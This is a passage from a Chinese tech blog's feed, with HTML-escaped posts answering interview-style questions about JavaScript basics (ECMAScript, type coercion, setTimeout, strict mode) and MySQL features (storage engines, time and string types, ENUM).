  &lt;li&gt;在浏览器上模拟出一个Linux系统：JsLinux&lt;/li&gt;
  &lt;li&gt;在浏览器上模拟出一个Git版本控制系统：JS-Git&lt;/li&gt;
  &lt;li&gt;制作动画：Processing.js&lt;/li&gt;
  &lt;li&gt;物理效果模拟引擎：verlet-js&lt;/li&gt;
  &lt;li&gt;可编辑的在线发票生成器：Invoice&lt;/li&gt;
  &lt;li&gt;在线待办事宜列表：Todo List&lt;/li&gt;
  &lt;li&gt;为图片加效果(需要HTML5 canvas支持)：blend.js&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;当然JavaScript是作为脚本语言存在的，所以基本上它只是调用现有的底层API，也就是用其他低级语言所编写的模块，而JavaScript任务就是调用这些API去处理实际的问题。&lt;/p&gt;

&lt;h2 id=&quot;javascript由哪几部分组成&quot;&gt;JavaScript由哪几部分组成？&lt;/h2&gt;

&lt;p&gt;尽管 ECMAScript 是一个重要的标准，但它并不是 JavaScript 唯一的部分，当然，也不是唯一被标准化的部分。实际上，一个完整的 JavaScript 实现是由以下 3 个不同部分组成的：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;核心（ECMAScript）&lt;/li&gt;
  &lt;li&gt;文档对象模型（DOM）&lt;/li&gt;
  &lt;li&gt;浏览器对象模型（BOM）&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;什么是ecmascript&quot;&gt;什么是ECMAScript？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;ECMAScript是一种由Ecma国际（前身为欧洲计算机制造商协会）通过ECMA-262标准化的脚本程序设计语言。这种语言在万维网上应用广泛，它往往被称为JavaScript或JScript，但实际上后两者是ECMA-262标准的实现和扩展。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;ECMAScript 是标准化组织 ECMA（Ecma International - European association for standardizing information and communication systems）发布的脚本语言规范。现在大家常见的 JavaScript、微软的 JScript 以及 Adobe 的 ActionScript 等语言都是遵循这个规范的，属于 ECMAScript 语言的变体。每个 ECMAScript 规范的变体语言都可能增加自己额外的功能特性。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;各浏览器执行的ecmascript版本是什么情况&quot;&gt;各浏览器执行的ECMAScript版本是什么情况？&lt;/h2&gt;

&lt;p&gt;许多程序，尤其是网页浏览器支持ECMAScript。浏览器中的ECMAScript实现添加了与文档对象模型的接口，可以通过脚本改变网页的内容、结构和样式。&lt;/p&gt;

&lt;h2 id=&quot;parseint08在什么情况下等于0什么情况下等于8&quot;&gt;&lt;code&gt;parseInt('08')&lt;/code&gt;在什么情况下等于0,什么情况下等于8？&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;'8' is not an octal digit.&lt;/code&gt;
ECMAScript 5 规范中 parseInt 函数部分不在允许实现环境把以 0 字符开始的字符串作为八进制数值了。&lt;/p&gt;

&lt;h2 id=&quot;settimeout方法如果第二个参数是0-那么是立即执行吗&quot;&gt;setTimeout方法，如果第二个参数是0, 那么是立即执行吗？&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;setTimeout( function(){ while(true){} } , 100);
setTimeout( function(){ alert(’你好!’); } , 200);
setInterval( callbackFunction , 200);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;setTimeout is simply like calling the funcion after delay has finished. Whenever a function is called it is not executed immediately, but queued so that it is executed after all the executing and currently queued eventhandlers finish first. setTimeout(,0) essentially means execute after all current functions in the present queue get executed. No guruantees can be made about how long it could take.&lt;/p&gt;

&lt;p&gt;setImmediate is similar in this regard except that it doesn’t use queue of functions. It checks queue of I/O eventhandlers. If all I/O events in the current snapshot are processed, it executes the callback. It queues them immedieately after the last I/O handler somewhat like process.nextTick. So it is faster.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;JavaScript引擎是单线程运行的,浏览器无论在什么时候都只且只有一个线程在运行JavaScript程序.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;如果队列非空,引擎就从队列头取出一个任务,直到该任务处理完,即返回后引擎接着运行下一个任务,在任务没返回前队列中的其它任务是没法被执行的.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;switch变量变量和case语句当中出现的值等于还是&quot;&gt;switch（变量），变量和case语句当中出现的值等于===还是==？&lt;/h2&gt;

&lt;p&gt;==用来判断两个值是否相等。当两个值类型不同时，会发生自动转换，得到的结果非常不符合直觉。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&quot;&quot; == &quot;0&quot; // false
0 == &quot;&quot; // true
0 == &quot;0&quot; // true
false == &quot;false&quot; // false
false == &quot;0&quot; // true
false == undefined // false
false == null // false
null == undefined // true
&quot; \t\r\n&quot; == 0 // true
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;undefined和null的区别是什么&quot;&gt;Undefined和Null的区别是什么？&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;null表示”没有对象”，即该处不应该有值。典型用法是：
    &lt;ul&gt;
      &lt;li&gt;作为函数的参数，表示该函数的参数不是对象。&lt;/li&gt;
      &lt;li&gt;作为对象原型链的终点。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;undefined表示”缺少值”，就是此处应该有一个值，但是还没有定义。典型用法是：
    &lt;ul&gt;
      &lt;li&gt;变量被声明了，但没有赋值时，就等于undefined。&lt;/li&gt;
      &lt;li&gt;调用函数时，应该提供的参数没有提供，该参数等于undefined。&lt;/li&gt;
      &lt;li&gt;对象没有赋值的属性，该属性的值为undefined。&lt;/li&gt;
      &lt;li&gt;函数没有返回值时，默认返回undefined。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;什么情况下会产生意外的全局变量&quot;&gt;什么情况下会产生意外的全局变量？&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;忽略了关键字&lt;code&gt;var&lt;/code&gt; （误写）&lt;/li&gt;
  &lt;li&gt;隐式全局变量 &lt;code&gt;var a = b = 3;&lt;/code&gt; » &lt;code&gt;var a = ( b = 3)&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;函数没被调用&lt;/p&gt;

    &lt;p&gt;var obj = {
   doSomething:function() {
     var a = “bob”;
     console.log(this);
     (function() {
       console.log(this);
       console.log(a);
     }());
   }
 }
 obj.doSomething()&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;如何遍历数组&quot;&gt;如何遍历数组？&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;var x
var mycars = new Array()
mycars[0] = &quot;Saab&quot;
mycars[1] = &quot;Volvo&quot;
mycars[2] = &quot;BMW&quot;
for (x in mycars)
{
document.write(mycars[x] + &quot;&amp;lt;br /&amp;gt;&quot;)
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;在进行比较false时类型的转换过程是怎样的&quot;&gt;在进行比较false=={}时，类型的转换过程是怎样的？&lt;/h2&gt;

&lt;p&gt;比较运算x==y, 其中x和 y是值，产生true或者false。这样的比较按如下方式进行：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;若Type(x)与Type(y)相同， 则&lt;/li&gt;
  &lt;li&gt;若Type(x)为Undefined， 返回true。&lt;/li&gt;
  &lt;li&gt;若Type(x)为Null， 返回true。&lt;/li&gt;
  &lt;li&gt;若Type(x)为Number， 则返回false。&lt;/li&gt;
  &lt;li&gt;若x为NaN， 返回false。&lt;/li&gt;
  &lt;li&gt;若y为NaN， 返回false。&lt;/li&gt;
  &lt;li&gt;若x与y为相等数值， 返回true。&lt;/li&gt;
  &lt;li&gt;若x 为 +0 且 y为−0， 返回true。&lt;/li&gt;
  &lt;li&gt;若x 为 −0 且 y为+0， 返回true。&lt;/li&gt;
  &lt;li&gt;&lt;/li&gt;
  &lt;li&gt;若Type(x)为String, 则当x和y为完全相同的字符序列（长度相等且相同字符在相同位置）时返回true。 否则， 返回false。&lt;/li&gt;
  &lt;li&gt;若Type(x)为Boolean, 当x和y为同为true或者同为false时返回true。 否则， 返回false。&lt;/li&gt;
  &lt;li&gt;当x和y为引用同一对象时返回true。否则，返回false。&lt;/li&gt;
  &lt;li&gt;若x为null且y为undefined， 返回true。&lt;/li&gt;
  &lt;li&gt;若x为undefined且y为null， 返回true。&lt;/li&gt;
  &lt;li&gt;若Type(x) 为 Number 且 Type(y)为String， 返回comparison x == ToNumber(y)的结果。&lt;/li&gt;
  &lt;li&gt;若Type(x) 为 String 且 Type(y)为Number，&lt;/li&gt;
  &lt;li&gt;返回比较ToNumber(x) == y的结果。&lt;/li&gt;
  &lt;li&gt;若Type(x)为Boolean， 返回比较ToNumber(x) == y的结果。&lt;/li&gt;
  &lt;li&gt;若Type(y)为Boolean， 返回比较x == ToNumber(y)的结果。&lt;/li&gt;
  &lt;li&gt;若Type(x)为String或Number，且Type(y)为Object，返回比较x == ToPrimitive(y)的结果。&lt;/li&gt;
  &lt;li&gt;若Type(x)为Object且Type(y)为String或Number， 返回比较ToPrimitive(x) == y的结果。&lt;/li&gt;
  &lt;li&gt;返回false。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;如果某个外部引用的js文件出现运行时错误后面的脚本还可以执行吗&quot;&gt;如果某个外部引用的Js文件出现运行时错误，后面的脚本还可以执行吗？&lt;/h2&gt;

&lt;h2 id=&quot;全局变量有什么弊端&quot;&gt;全局变量有什么弊端？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;一般创建全局变量都认为是比较糟糕的实践，尤其是在团队开发的大背景下更是问题多多。随着代码量的增长，全局变量会导致一些非常重要的可维护性你难题。全局变量越多，引入错误的概率就越高。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;当脚本中的全局变量越来越多时，也容易发生命名冲突，即可能无意间就使用了一个已经声明的变量名字。所有的变量都被定义为局部变量，这样代码才是最好维护的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;什么是严格模式&quot;&gt;什么是严格模式？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;ECMAScript 规范第五版的一个重要新特性是引入了代码执行时的严格模式。在严格模式下，对于 ECMAScript 代码执行时的限制更多。某些使用方式在严格模式下是不允许的。这有利于避免一些潜在的问题，提高代码的鲁棒性。一般来说，框架需要可以在严格模式下能正确运行，而一般的应用程序则可以选择是否使用严格模式。通过在 ECMAScript 代码的最开始使用 “use strict” 或 ‘use strict’ 就可以声明这段代码需要运行在严格模式下。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;哪个值不等于自己&quot;&gt;哪个值不等于自己？&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;NaN&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;函数&quot;&gt;函数&lt;/h1&gt;

&lt;h2 id=&quot;如何实现函数参数的默认值&quot;&gt;如何实现函数参数的默认值？&lt;/h2&gt;

&lt;h2 id=&quot;如何实现函数的链式调用&quot;&gt;如何实现函数的链式调用？&lt;/h2&gt;

&lt;h2 id=&quot;函数的参数是值传递还是引用传值&quot;&gt;函数的参数是值传递还是引用传值？&lt;/h2&gt;

&lt;h2 id=&quot;什么是即时函数立即调用的函数表达式&quot;&gt;什么是即时函数（立即调用的函数表达式）？&lt;/h2&gt;

&lt;h2 id=&quot;什么情况下new构造函数得到的对象不是该构造函数的实例&quot;&gt;什么情况下new构造函数，得到的对象不是该构造函数的实例？&lt;/h2&gt;

&lt;h2 id=&quot;什么情况下对象的方法执行时this不能指向该对象本身&quot;&gt;什么情况下对象的方法执行时this不能指向该对象本身？&lt;/h2&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;参考&quot;&gt;参考&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/1305_chengfu_ecmascript5/&quot;&gt;深入探讨 ECMAScript 规范第五版&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.ruanyifeng.com/blog/2013/01/javascript_strict_mode.html&quot;&gt;Javascript 严格模式详解&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/parseInt&quot;&gt;parseInt&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.iamued.com/qianduan/1645.html&quot;&gt;javascript线程解释（setTimeout,setInterval你不知道的事）&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.ruanyifeng.com/blog/2014/03/undefined-vs-null.html&quot;&gt;undefined与null的区别&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://prezi.com/0nvpargkptwc/presentation/&quot;&gt;意外造成全局变量的误区&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.ruanyifeng.com/blog/2011/06/10_design_defects_in_javascript.html&quot;&gt;Javascript的10个设计缺陷&lt;/a&gt;\&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>MySQL高级使用和特性</title>
   <link href="http://yanpeipan.github.io/2014/12/29/MySQL%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E5%92%8C%E7%89%B9%E6%80%A7.html"/>
   <updated>2014-12-29T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2014/12/29/MySQL高级使用和特性</id>
   <content type="html">
&lt;hr /&gt;

&lt;h1 id=&quot;mysql体系结构&quot;&gt;MySQL体系结构&lt;/h1&gt;

&lt;h2 id=&quot;什么是体系结构&quot;&gt;什么是体系结构？&lt;/h2&gt;

&lt;h2 id=&quot;mysql部件包括哪些&quot;&gt;MySQL部件包括哪些？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;连接池组件&lt;/li&gt;
  &lt;li&gt;管理服务和工具组件&lt;/li&gt;
  &lt;li&gt;SQL接口组件&lt;/li&gt;
  &lt;li&gt;查询分析器组件&lt;/li&gt;
  &lt;li&gt;优化器组件&lt;/li&gt;
  &lt;li&gt;缓冲（Cache）组件&lt;/li&gt;
  &lt;li&gt;插件式存储引擎&lt;/li&gt;
  &lt;li&gt;物理文件&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;各个部件之间的执行顺序是什么&quot;&gt;各个部件之间的执行顺序是什么？&lt;/h2&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;mysql存储引擎&quot;&gt;MySQL存储引擎&lt;/h1&gt;

&lt;h2 id=&quot;mysql常见的存储引擎有哪些&quot;&gt;MySQL常见的存储引擎有哪些？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;innodb存储引擎：面向oltp(online transaction processing)、行锁、支持外键、非锁定读、默认采用repeaable级别（可重复读）通过next-keylocking策略避免幻读、插入缓冲、二次写、自适应哈希索引、预读&lt;/li&gt;
  &lt;li&gt;myisam存储引擎：不支持事务、表锁、全文索引、适合olap（在线分析处理），其中myd:放数据文件，myi:放索引文件&lt;/li&gt;
  &lt;li&gt;ndb存储引擎：集群存储引擎，share nothing，可提高可用性&lt;/li&gt;
  &lt;li&gt;memory存储引擎：数据存放在内存中，表锁，并发性能差，默认使用哈希索引&lt;/li&gt;
  &lt;li&gt;archive存储引擎：只支持insert和select zlib算法压缩1：10，适合存储归档数据如日志等、行锁&lt;/li&gt;
  &lt;li&gt;maria存储引擎：目的取代myisam、缓存数据和索引、行锁、mvcc&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;myisam和innodb有什么不同如何选择存储引擎&quot;&gt;MyISAM和InnoDB有什么不同？如何选择存储引擎？&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;MySQL存储引擎MyISAM与InnoDB的优劣&lt;/strong&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;×&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;MyISAM&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;InnoDB&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;存储结构&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;每张表被存放在三个文件：frm-表格定义MYD(MYData)-数据文件MYI(MYIndex)-索引文件&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;所有的表都保存在同一个数据文件中（也可能是多个文件，或者是独立的表空间文件），InnoDB表的大小只受限于操作系统文件的大小，一般为2GB&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;存储空间&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;MyISAM可被压缩，存储空间较小&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;InnoDB的表需要更多的内存和存储，它会在主内存中建立其专用的缓冲池用于高速缓冲数据和索引&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;可移植性、备份及恢复&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;由于MyISAM的数据是以文件的形式存储，所以在跨平台的数据转移中会很方便。在备份和恢复时可单独针对某个表进行操作&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;免费的方案可以是拷贝数据文件、备份 binlog，或者用 mysqldump，在数据量达到几十G的时候就相对痛苦了&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;事务安全&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;不支持&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;每次查询具有原子性 支持 具有事务(commit)、回滚(rollback)和崩溃修复能力(crash recovery capabilities)的事务安全(transaction-safe (ACID compliant))型表&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;AUTO_INCREMENT&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;MyISAM表可以和其他字段一起建立联合索引&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;InnoDB中必须包含只有该字段的索引&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;SELECT&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;MyISAM更优&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;INSERT&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;InnoDB更优&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;UPDATE&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;InnoDB更优&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;DELETE&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt; &lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;InnoDB更优 它不会重新建立表，而是一行一行的删除&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;COUNT without WHERE&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;MyISAM更优。因为MyISAM保存了表的具体行数&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;InnoDB没有保存表的具体行数，需要逐行扫描统计，就很慢了&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;COUNT with WHERE&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;一样&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;一样，InnoDB也会锁表&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;锁&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;只支持表锁&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;支持表锁、行锁 行锁大幅度提高了多用户并发操作的新能。但是InnoDB的行锁，只是在WHERE的主键是有效的，非主键的WHERE都会锁全表的&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;外键&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;不支持&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;支持&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;FULLTEXT全文索引&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;支持&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;不支持 可以通过使用Sphinx从InnoDB中获得全文索引，会慢一点&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;strong&gt;InnoDB 还是 MyISAM?&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;你的数据库有外键吗？&lt;/li&gt;
  &lt;li&gt;你需要事务支持吗？&lt;/li&gt;
  &lt;li&gt;你需要全文索引吗？&lt;/li&gt;
  &lt;li&gt;你经常使用什么样的查询模式？&lt;/li&gt;
  &lt;li&gt;你的数据有多大？&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;如果你需要事务处理或是外键，那么InnoDB 可能是比较好的方式。如果你需要全文索引，那么通常来说 MyISAM是好的选择，因为这是系统内建的，然而，我们其实并不会经常地去测试两百万行记录。所以，就算是慢一点，我们可以通过使用Sphinx从InnoDB中获得全文索引。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;数据的大小，是一个影响你选择什么样存储引擎的重要因素，大尺寸的数据集趋向于选择InnoDB方式，因为其支持事务处理和故障恢复。数据库的在小决定了故障恢复的时间长短，InnoDB可以利用事务日志进行数据恢复，这会比较快。而MyISAM可能会需要几个小时甚至几天来干这些事，InnoDB只需要几分钟。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;操作数据库表的习惯可能也会是一个对性能影响很大的因素。比如： COUNT() 在 MyISAM 表中会非常快，而在InnoDB 表下可能会很痛苦。而主键查询则在InnoDB下会相当相当的快，但需要小心的是如果我们的主键太长了也会导致性能问题。大批的inserts 语句在MyISAM下会快一些，但是updates 在InnoDB 下会更快一些——尤其在并发量大的时候。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;根据经验来看，如果是一些小型的应用或项目，那么MyISAM 也许会更适合。当然，在大型的环境下使用MyISAM 也会有很大成功的时候，但却不总是这样的。如果你正在计划使用一个超大数据量的项目，而且需要事务处理或外键支持，那么你真的应该直接使用InnoDB方式。但需要记住InnoDB 的表需要更多的内存和存储，转换100GB 的MyISAM 表到InnoDB 表可能会让你有非常坏的体验。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;存储时间类型字段用int还是datetime类型为什么&quot;&gt;存储时间类型字段用int还是datetime类型？为什么？&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;int&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;占用4个字节&lt;/li&gt;
  &lt;li&gt;建立索引之后，查询速度快&lt;/li&gt;
  &lt;li&gt;条件范围搜索可以使用使用between&lt;/li&gt;
  &lt;li&gt;不能使用mysql提供的时间函数&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;结论：适合需要进行大量时间范围查询的数据表&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;datetime&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;占用8个字节&lt;/li&gt;
  &lt;li&gt;允许为空值，可以自定义值，系统不会自动修改其值。&lt;/li&gt;
  &lt;li&gt;实际格式储存（Just stores what you have stored and retrieves the same thing which you have stored.）&lt;/li&gt;
  &lt;li&gt;与时区无关（It has nothing to deal with the TIMEZONE and Conversion.）&lt;/li&gt;
  &lt;li&gt;不可以设定默认值，所以在不允许为空值的情况下，必须手动指定datetime字段的值才可以成功插入数据。&lt;/li&gt;
  &lt;li&gt;可以在指定datetime字段的值的时候使用now()变量来自动插入系统的当前时间。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;结论：datetime类型适合用来记录数据的原始的创建时间，因为无论你怎么更改记录中其他字段的值，datetime字段的值都不会改变，除非你手动更改它。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;timestamp&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;占用4个字节&lt;/li&gt;
  &lt;li&gt;允许为空值，但是不可以自定义值，所以为空值时没有任何意义。&lt;/li&gt;
  &lt;li&gt;TIMESTAMP值不能早于1970或晚于2037。这说明一个日期，例如’1968-01-01’，虽然对于DATETIME或DATE值是有效的，但对于TIMESTAMP值却无效，如果分配给这样一个对象将被转换为0。
4.值以UTC格式保存（ it stores the number of milliseconds）
5.时区转化 ，存储时对当前的时区进行转换，检索时再转换回当前的时区。&lt;/li&gt;
  &lt;li&gt;默认值为CURRENT_TIMESTAMP()，其实也就是当前的系统时间。&lt;/li&gt;
  &lt;li&gt;数据库会自动修改其值，所以在插入记录时不需要指定timestamp字段的名称和timestamp字段的值，你只需要在设计表的时候添加一个timestamp字段即可，插入后该字段的值会自动变为当前系统时间。&lt;/li&gt;
  &lt;li&gt;以后任何时间修改表中的记录时，对应记录的timestamp值会自动被更新为当前的系统时间。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;结论：timestamp类型适合用来记录数据的最后修改时间，因为只要你更改了记录中其他字段的值，timestamp字段的值都会被自动更新。&lt;/p&gt;

&lt;h2 id=&quot;如果是字符串类型字段选char好还是选varchar好为什么&quot;&gt;如果是字符串类型，字段选char好还是选varchar好？为什么？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;CHAR和VARCHAR类型声明的长度表示你想要保存的最大字符数。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;CHAR列的长度固定为创建表时声明的长度。长度可以为从0到255的任何值。当保存CHAR值时，在它们的右边填充空格以达到指定的长度。当检索到CHAR值时，尾部的空格被删除掉。在存储或检索过程中不进行大小写转换。&lt;/li&gt;
  &lt;li&gt;VARCHAR列中的值为可变长字符串。长度可以指定为0到65,535之间的值。(VARCHAR的最大有效长度由最大行大小和使用的字符集确定。整体最大长度是65,532字节）。
同CHAR对比，VARCHAR值保存时只保存需要的字符数，另加一个字节来记录长度(如果列声明的长度超过255，则使用两个字节)。&lt;/li&gt;
  &lt;li&gt;VARCHAR值保存时不进行填充。当值保存和检索时尾部的空格仍保留，符合标准SQL。
如果分配给CHAR或VARCHAR列的值超过列的最大长度，则对值进行裁剪以使其适合。如果被裁掉的字符不是空格，则会产生一条警告。如果裁剪非空格字符，则会造成错误(而不是警告)并通过使用严格SQL模式禁用值的插入。参见5.3.2节，“SQL服务器模式”。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;枚举类型应用在什么场景下有什么缺陷&quot;&gt;枚举类型应用在什么场景下？有什么缺陷？&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;布尔类型&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;MySQL数据库产品没有真正实现对布尔类型的支持，建议大家不要使用MySQL布尔类型BOOL或布尔类型BOOLEAN，而是使用数据库类型微整型TINYINT替代。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;枚举类型&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;MySQL枚举类型的枚举元素允许最大65535个&lt;/li&gt;
  &lt;li&gt;引入枚举类型数据存储，有利于缩减数据库存储数据的容量，尤其能达到减少数据库瓶颈最大的物理IO，逻辑IO也能减小，提高主机的处理能力；&lt;/li&gt;
  &lt;li&gt;引入枚举类型数据存储，有利于简化工程师的代码复杂度、工作量，增加代码的可读性和可维护性；&lt;/li&gt;
  &lt;li&gt;可以通过枚举类型元素值访问数据，也可以根据枚举类型元素编号进行访问数据；&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;缺点：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;MySQL数据库枚举类型的引入，可能给软件程序的版本发布，存在遗忘数据库结构变更的隐患；&lt;/li&gt;
  &lt;li&gt;MySQL数据库枚举类型字段的元素增加，必须以尾部追加的方式，否则影响数据库提供数据服务；&lt;/li&gt;
  &lt;li&gt;枚举类型字段不再需要的元素，也不能进行删除，否则影响数据库提供数据服务；&lt;/li&gt;
  &lt;li&gt;MySQL数据库枚举类型的字段定义属性元素值，不能随意调整其顺序，否则影响数据库提供数据服务；&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;MySQL数据库枚举类型是一种有应用场景广泛的数据类型，若是抛开网站程序或软件版本发布，可能会导致开发工程师与数据库维护人员之间没有配合好的问题，非常推荐大家把枚举类型引入到生产环境的数据库应用中，对企业而言也可以起到节省人力、物理等成本。建议大家使用枚举类型的时候，尽量把可能需要用到的枚举元素，都写到MySQL数据库表字段的定义属性中，减少出现漏做DDL变更的故障。&lt;/p&gt;
